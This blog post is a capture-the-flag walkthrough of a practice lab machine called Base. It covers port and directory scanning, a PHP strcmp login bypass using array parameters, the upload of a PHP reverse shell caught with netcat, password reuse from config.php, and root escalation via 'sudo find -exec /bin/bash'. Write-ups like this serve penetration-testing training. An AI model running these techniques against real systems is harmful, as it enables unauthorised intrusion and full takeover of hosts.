---
title: "Writeup: Base"
date: 2021-01-21T17:34:30-04:00
categories:
  - Blog
  - Writeup
tags:
  - base
  - update
  - nmap
  - linux
  - strings
  - burp
  - php
  - nc
  - reverse shell
  - gobuster
  - upgrade shell
  - su
  - sudo -l
  - sudo command exploit
---

Here are notes from the named target:
Target Linux
Host name Base
IP 10.10.10.48

#Enumeration
Start with simple nmap scan - nmap -sV -sC -p- -Pn 10.10.10.48 --min-rate=10000

Looks like ssh and web
```yaml
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f6:5c:9b:38:ec:a7:5c:79:1c:1f:18:1c:52:46:f7:0b (RSA)
|   256 65:0c:f7:db:42:03:46:07:f2:12:89:fe:11:20:2c:53 (ECDSA)
|_  256 b8:65:cd:3f:34:d8:02:6a:e3:18:23:3e:77:dd:87:40 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).

```
Tried the root password and daniel ssh loging from previous target but neither worked so going to take a look at the web servLooking at website it has a login screen at http:/10.10.10.48/login/login.php

Lets look for directories and maybe get some info from gobuster - best to just download the binary and run it that way
```yaml
gobuster dir -u http://10.10.10.48 -w /usr/share/wordlists/dirb/big.txt

Results
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/01/22 17:42:12 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/_uploaded            (Status: 301) [Size: 314] [--> http://10.10.10.48/_uploaded/]
/login                (Status: 301) [Size: 310] [--> http://10.10.10.48/login/]    
/server-status        (Status: 403) [Size: 276]                                    
/static               (Status: 301) [Size: 311] [--> http://10.10.10.48/static/]   
```

view source does not show anything but lets look and see if inything can be seen in the /login folder beside "login.php":

we see a total of three files
1. config.php
2. login.php
3. login.php.swp

Nothing is in config.php and we already see login.php so taking a look at login.php.swp prompts me to save the file.
```yaml
t('Wrong Username or Password')</script>");    } else {        }            print("<script>alert('Wrong Username or Password')</script>");        } else {            header("Location: upload.php");            $_SESSION['user_id'] = 1;        if (strcmp($password, $_POST['password']) == 0) {    if (strcmp($username , $_POST['username']) == 0) {    require('config.php');if (!empty($_POST['username']) && !empty($_POST['password']
```

You can use strings here on this file to look at its info but it is a small file and easy enough with cat

the cool thing is that this login.php page is using a string compare (strcmp) function to check the username and password supplied and that can be exploited by passing in array[] to the variables using BURP. Next step is to set the browser proxy and start burp. Capture the login with test and test
```yaml
OST /login/login.php HTTP/1.1
Host: 10.10.10.48
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: http://10.10.10.48
Connection: close
Referer: http://10.10.10.48/login/login.php
Cookie: PHPSESSID=ojt0vhgaaaomru3m393qevuhse
Upgrade-Insecure-Requests: 1

username=test&password=test
```

then we pop in same arrays before we send it back to the server like this
```yaml
username[]=test&password[]=test
```
that logged us into the site as admin saying "welcome admin". See on this page ability to upload a file so lets upload a php reverse shell back to our Kali
using a netcat -nlvp 4848 for the targets ip address

We found through the gobuster application several directories and one was called "/_uploaded/" so after a test file and a php reverse shell upload we check and find they are in the directory
```yaml
Index of /_uploaded
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[ ]	48_rev.php	2021-01-22 22:15 	5.4K	 
[TXT]	test.txt	2021-01-22 22:17 	2 	 
Apache/2.4.29 (Ubuntu) Server at 10.10.10.48 Port 80
```

Start up netcat "nc -nlvp 4848 and then connect t the url "http://10.10.10.48/_uploaded/48_rev.php" Results are:
```yaml
┌──(root💀kali)-[~]
└─# nc -nlvp 4848
listening on [any] 4848 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.48] 47122
Linux base 4.15.0-88-generic #88-Ubuntu SMP Tue Feb 11 20:11:34 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 22:58:51 up 17:18,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

```
got a foot hold but low priv so seeing about users:
improve shell - python3 -c "import pty;pty.spawn('/bin/bash')" - worked:

check users "cat /etc/passwd: and find johnas a user

lets take a look in that config.php file for some passwords
```yaml
www-data@base:/var/www/html$ cd login
cd login
www-data@base:/var/www/html/login$ ls
ls
config.php  login.php  login.php.swp
www-data@base:/var/www/html/login$ cat config.php
cat config.php
<?php
$username = "admin";
$password = "thisisagoodpassword";www-data@base:/var/www/html/login$ 
```

Trying su with john : thisisagoodpassword
```yaml
www-data@base:/var/www/html/login$ cd /
cd /
www-data@base:/$ su john
su john
Password: thisisagoodpassword

john@base:/$ 
```
Now grab that flag

Check to see if you can run commands with sudo because we have the password
~~~yaml
sudo -l
password - but that did not work so tru ssh login

```yaml
* Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

8 packages can be updated.
0 updates are security updates.


Last login: Thu Mar 12 10:22:26 2020
john@base:~$ sudo -l
[sudo] password for john: 
Matching Defaults entries for john on base:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on base:
    (root : root) /usr/bin/find
john@base:~$ 

```

we can use find and run it as root - their is a way to run commands and get root with them if you can sudo with that command

This binary can be used to execute commands as. It searches for files in the root folder of the system and executes the bash shell as root.

```yaml
sudo /usr/bin/find /etc -exec /bin/bash \;

john@base:~$ sudo /usr/bin/find /etc -exec /bin/bash \;
root@base:~# ls
user.txt
root@base:~# pwd
/home/john
root@base:~# cd /root
root@base:/root# ls
root.txt
root@base:/root# 
```











